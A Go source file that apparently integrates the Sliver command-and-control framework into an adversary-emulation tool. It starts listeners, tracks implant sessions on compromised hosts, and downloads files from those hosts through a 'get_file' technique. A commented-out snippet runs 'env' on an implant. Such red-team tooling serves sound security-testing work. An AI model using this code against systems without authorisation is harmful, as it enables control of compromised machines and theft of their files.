package c2

import (
	"bytes"
	"compress/gzip"
	"context"
	"errors"
	"fmt"
	"io"
	"log/slog"
	"net"
	"slices"
	"strconv"
	"strings"
	"sync"

	"github.com/Magier/Ran/domain"
	"github.com/bishopfox/sliver/client/assets"
	consts "github.com/bishopfox/sliver/client/constants"
	"github.com/bishopfox/sliver/client/transport"
	"github.com/bishopfox/sliver/protobuf/clientpb"
	"github.com/bishopfox/sliver/protobuf/commonpb"
	"github.com/bishopfox/sliver/protobuf/rpcpb"
	"github.com/bishopfox/sliver/protobuf/sliverpb"
)

const SliverKind = "sliver"

type SliverClient struct {
	Name        string
	config      *assets.ClientConfig
	rpc         rpcpb.SliverRPCClient
	cmdChannel  chan domain.Command
	eventStream chan domain.Event
	isReady     bool
	conn        io.Closer
	cancel      context.CancelFunc
	wg          sync.WaitGroup
}

func CreateSliverClient(configPath string) (SliverClient, error) {
	// load the client configuration from the filesystem
	config, err := assets.ReadConfig(configPath)
	if err != nil {
		return SliverClient{}, fmt.Errorf("Could not load sliver config: %w", err)
	}
	return SliverClient{
		Name:        SliverKind,
		config:      config,
		cmdChannel:  make(chan domain.Command, 1),
		eventStream: make(chan domain.Event, 100), // unsure how many jobs/sessions exist when connecting to sliver
	}, nil
}

func (c *SliverClient) Connect(parentCtx context.Context) error {
	// connect to the server
	rpc, conn, err := transport.MTLSConnect(c.config)
	if err != nil {
		return err
	}
	c.conn = conn
	c.rpc = rpc
	// 2) derive a cancellable ctx tied to the caller’s ctx
	ctx, cancel := context.WithCancel(parentCtx)
	c.cancel = cancel
	serverIp := c.GetServerIp()

	c.eventStream <- domain.C2Connected{
		Name: c.Name,
		IP:   serverIp,
		Kind: SliverKind,
	}
	reportOpenListeners(rpc, c.eventStream, c.config.LPort)
	reportEstablishedSessions(rpc, c.eventStream)

	// Open the event stream to be able to collect all events sent by  the server
	sliverEventStream, err := rpc.Events(ctx, &commonpb.Empty{})
	if err != nil {
		// best-effort cleanup
		_ = c.closeUnderlying()
		slog.Error(err.Error())
	}

	// handle all incoming events in the background
	events := make(chan *clientpb.Event, 64) // small buffer to avoid "head-of-line blocking"
	c.wg.Add(1)
	go c.recvServerEvents(ctx, sliverEventStream, events)

	// handle all commands sent to the Sliver server
	c.wg.Add(1)
	go c.runDispatchLoop(ctx, events)
	return nil
}

// recvServerEvents continuously receives events from the gRPC stream and fans them into 'out'.
// It exits when ctx is cancelled, the stream ends, or a recv error occurs.
// It always closes 'out' on exit.
func (c *SliverClient) recvServerEvents(
	ctx context.Context,
	stream rpcpb.SliverRPC_EventsClient,
	out chan<- *clientpb.Event,
) {
	defer c.wg.Done()
	defer close(out)

	for {
		evt, err := stream.Recv()
		if err == io.EOF {
			return
		}
		if err != nil {
			slog.Error("event recv failed", "err", err)
			return
		}
		if evt == nil {
			continue
		}
		select {
		case <-ctx.Done():
			return
		case out <- evt:
		}
	}
}

// runDispatchLoop multiplexes between:
// - ctx cancellation
// - incoming commands (c.cmdChannel)
// - incoming server events (events)
// It returns when ctx is cancelled or when the server events channel closes.
func (c *SliverClient) runDispatchLoop(
	ctx context.Context,
	events <-chan *clientpb.Event,
) {
	defer c.wg.Done()

	for {
		select {
		case <-ctx.Done():
			return

		case cmd, ok := <-c.cmdChannel:
			if !ok {
				c.cmdChannel = nil
				continue
			}
			event, err := c.handleCommand(cmd)
			if err != nil {
				slog.Error("Sliver C2: could not send cmd", "err", err)
			}
			if event != nil {
				select {
				case <-ctx.Done():
					return
				case c.eventStream <- event:
				}
			}

		case evt, ok := <-events:
			if !ok {
				// Server event stream ended; stop the loop.
				return
			}
			go c.handleSliverEvent(c.eventStream, evt)
		}
	}
}

func (c *SliverClient) Shutdown() {
	if c.cancel != nil {
		c.cancel()
	}
	close(c.cmdChannel)
	c.wg.Wait()
	_ = c.closeUnderlying()
}

func (c *SliverClient) GetEventStream() <-chan domain.Event {
	return c.eventStream
}

func (c *SliverClient) closeUnderlying() error {
	var first error
	if c.conn != nil {
		if err := c.conn.Close(); err != nil {
			first = err
		}
		c.conn = nil
	}
	return first
}

func (c *SliverClient) SetReady(state bool) C2Client {
	c.isReady = state
	return c
}

func (c *SliverClient) IsReady() bool {
	return c.isReady
}

func (c *SliverClient) GetName() string {
	return c.Name
}

func (c *SliverClient) GetServerIp() net.IP {
	var ip net.IP
	// resolve the local IP to the 'external' one, so the compromised systems can reach it
	if slices.Contains([]string{"0.0.0.0", "localhost"}, c.config.LHost) {
		ip = GetOutboundIP()
	} else {
		ip = net.ParseIP(c.config.LHost)
	}
	return ip
}

func (c *SliverClient) handleSliverEvent(results chan<- domain.Event, event *clientpb.Event) error {
	var resultingMessage domain.Event
	// Trigger event based on type
	switch event.EventType {
	// a new session just came in
	case consts.SessionOpenedEvent:
		resultingMessage = SessionStarted{Session: parseSession(event.Session), C2Kind: SliverKind}
	case consts.SessionClosedEvent:
		resultingMessage = SessionClosed{Session: parseSession(event.Session)}

	case consts.JobStartedEvent:
		job := event.Job
		// resolve the local IP to the 'external' one, so the compromised systems can reach it
		resultingMessage = parseListener(job)

	case consts.JobStoppedEvent:
		job := event.Job
		resultingMessage = ListenerStopped{
			Name: fmt.Sprintf("sliver_%s", job.Name),
			Port: uint(job.Port),
		}
	default:
		slog.Info("Ignoring unknown sliver event", "type", event.EventType)
	}

	results <- resultingMessage
	return nil
}

func (c *SliverClient) handleCommand(msg domain.Command) (domain.Event, error) {
	switch cmd := msg.(type) {
	case domain.StartListener:
		return c.startListener(cmd)
	case domain.StopListener:
		return c.stopListener(cmd)
	case domain.ExecTTP:
		c2Channel := cmd.C2Channel.(domain.ImplantC2Channel)
		switch cmd.Procedure.Command {
		case "get_file":
			path, ok := cmd.Args["Path"]
			if !ok {
				return nil, fmt.Errorf("Path of file to retrieve is required as argument")
			}
			if len(cmd.Args) != 1 {
				var args []string
				for k, v := range cmd.Args {
					args = append(args, fmt.Sprintf("%s=%s", k, v))
				}
				argsStr := strings.Join(args, ", ")
				slog.Warn("Received unknown arguments to download file: " + argsStr)
			}

			data, err := c.downloadFile(c2Channel.SessionId, path)
			if err != nil {
				return nil, err
			}
			// TODO: get rid of the result handling here and return generic result
			return cmd.TTP.HandleResult(cmd.Target, data)
		default:
			slog.Warn("Sliver C2 does not support command: " + cmd.Procedure.Command)
		}
	}

	// // call any RPC you want, for the full list, see
	// // https://github.com/BishopFox/sliver/blob/master/protobuf/rpcpb/services.proto
	// resp, err := rpc.Execute(context.Background(), &sliverpb.ExecuteReq{
	// 	Path:    `env`,
	// 	Output:  true,
	// 	Request: makeRequest(session),
	// })
	// if err != nil {
	// 	log.Fatal(err)
	// }
	// // Don't forget to check for errors in the Response object
	// if resp.Response != nil && resp.Response.Err != "" {
	// 	log.Fatal(resp.Response.Err)
	// }

	return nil, nil
}

func parseSession(session *clientpb.Session) domain.Session {
	return domain.Session{
		Id:          session.ID,
		Name:        session.Name,
		Hostname:    session.Hostname,
		Os:          session.OS,
		Arch:        session.Arch,
		OsVersion:   session.Version,
		PID:         int(session.PID),
		ProcessName: session.Filename,
		User:        session.Username,
		IsRoot:      session.UID == "0",
		UID:         session.UID,
		GID:         session.GID,
		RemoteAddr:  session.RemoteAddress,
	}
}

func parseListener(job *clientpb.Job) ListenerReady {
	return ListenerReady{
		ID:       fmt.Sprintf("%d", job.ID),
		Name:     fmt.Sprintf("sliver_%s", job.Name),
		Port:     uint(job.Port),
		C2Server: SliverKind,
		Protocol: domain.Protocol(strings.ToUpper(job.Protocol)),
	}
}

func reportOpenListeners(rpc rpcpb.SliverRPCClient, results chan<- domain.Event, clientPort int) {
	jobs, err := rpc.GetJobs(context.Background(), &commonpb.Empty{})
	if err != nil {
		slog.Error(err.Error())
	}

	for _, job := range jobs.Active {
		// no need to leak infrastructure details
		// so ignore the listener for new (multiplayer) clients
		if job.Port == uint32(clientPort) {
			continue
		}
		results <- parseListener(job)
	}
}

func reportEstablishedSessions(rpc rpcpb.SliverRPCClient, results chan<- domain.Event) {
	sessions, err := rpc.GetSessions(context.Background(), &commonpb.Empty{})
	if err != nil {
		slog.Error(err.Error())
	}
	for _, session := range sessions.GetSessions() {
		results <- SessionStarted{
			C2Kind:     SliverKind,
			C2Endpoint: session.ActiveC2,
			Session:    parseSession(session),
		}
	}
}

func (c *SliverClient) Execute(execTTP domain.Command) (domain.Message, error) {
	c.cmdChannel <- execTTP
	return nil, nil
}

func (c *SliverClient) startListener(ev domain.StartListener) (domain.Event, error) {
	switch ev.Protocol {
	case domain.HTTP:
		_, err := c.rpc.StartHTTPListener(context.Background(), &clientpb.HTTPListenerReq{
			Port: uint32(ev.Port),
		})
		if err != nil {
			return nil, errors.New("Starting Sliver Listener failed " + err.Error())
		}
		// there will be an event from sliver notifying about the successful creation of the listener
	default:
		return nil, fmt.Errorf("Starting Sliver %s Listener not yet implemented", ev.Protocol)
	}
	return nil, nil
}

func (c *SliverClient) stopListener(ev domain.StopListener) (domain.Event, error) {
	id, err := strconv.ParseUint(ev.ID, 10, 32)
	if err != nil {
		return nil, fmt.Errorf("invalid listener ID: %v", err)
	}
	r := clientpb.KillJobReq{ID: uint32(id)}
	_, err = c.rpc.KillJob(context.Background(), &r)
	if err != nil {
		return nil, errors.New("Stopping Sliver Listener failed " + err.Error())
	}
	return nil, fmt.Errorf("Stopping Sliver Listener not yet implemented")
}

func (c *SliverClient) downloadFile(sessionId, path string) ([]byte, error) {
	ctx := context.Background()
	dl, err := c.rpc.Download(ctx, &sliverpb.DownloadReq{Path: path,
		Request: makeRequest(sessionId)})

	if dl.Encoder == "gzip" {
		r, err := gzip.NewReader(bytes.NewReader(dl.Data))
		if err != nil {
			return nil, fmt.Errorf("Decoding failed %w", err)
		}
		raw, err := io.ReadAll(io.Reader(r))
		r.Close()
		if err != nil {
			return nil, fmt.Errorf("Decoding failed %w", err)
		}
		dl.Data = raw
	}

	return dl.GetData(), err
}

func makeRequest(sessionId string) *commonpb.Request {
	timeout := int64(60)
	return &commonpb.Request{
		SessionID: sessionId,
		Timeout:   timeout,
	}
}
